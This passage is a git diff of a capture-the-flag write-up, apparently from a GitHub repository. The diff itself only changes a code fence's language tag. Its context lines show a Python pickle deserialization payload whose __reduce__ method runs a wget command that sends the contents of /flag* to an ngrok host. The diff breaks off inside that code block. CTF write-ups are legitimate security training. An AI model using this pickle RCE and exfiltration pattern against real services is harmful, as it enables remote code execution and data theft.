@@ -320,7 +320,7 @@ At first it returned me a `200` response. While i should have gotten an `Interna
 ![image](https://github.com/hash3liZer/khatta/assets/29171692/5df209cf-3e5f-4a0a-ae0b-45bc7657993c)
 
 So, i modified the exploit a bit to get the flag: 
-```python
+```
 class RCE:
     def __reduce__(self):
         cmd = ('wget "https://2c52-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app/something$(cat /flag*)"',)
